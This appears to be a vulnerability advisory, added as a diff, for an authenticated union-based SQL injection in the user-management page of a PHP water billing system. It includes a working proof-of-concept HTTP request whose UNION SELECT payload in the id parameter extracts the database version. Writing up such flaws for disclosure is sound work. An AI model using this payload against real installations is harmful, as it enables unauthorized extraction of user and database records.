@@ -1,0 +1,22 @@
+# Authenticated SQL Injection in User Management - Water Billing Management System in PHP/OOP Free Source Code
+Date: May 8, 2026
+Vulnerability Type: Improper Neutralization of Special Elements used in an SQL Command (CWE-89)
+Project: Water Billing Management System in PHP/OOP
+
+The Water Billing Management System is vulnerable to an Authenticated SQL Injection flaw within the administrative dashboard. An attacker with valid low-level administrative credentials can manipulate the id parameter in the user management module to execute arbitrary SQL commands. This can lead to unauthorized data disclosure, including database versioning, structural information, and sensitive user records.
+
+### Vulnerability Description
+The application fails to properly sanitize or parameterize the id GET parameter in the /wbms/admin/?page=user/manage_user route. The input is passed directly into a SQL query string, allowing for Union-Based SQL Injection.
+
+While this requires the attacker to be logged into the admin panel, it represents a significant risk from "insider threats" or compromised sub-admin accounts, as it allows for vertical privilege escalation and full database extraction.
+
+
+An authenticated user can retrieve the database version by navigating to the following URL (or sending the raw request below):
+```
+GET /wbms/admin/?page=user/manage_user&id=.6'+UNION+SELECT+1,version(),3,4,5,6,7,8,9,10,11--+- HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=0h3k63jvp3rata66fdin0pqpi4
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9
+```
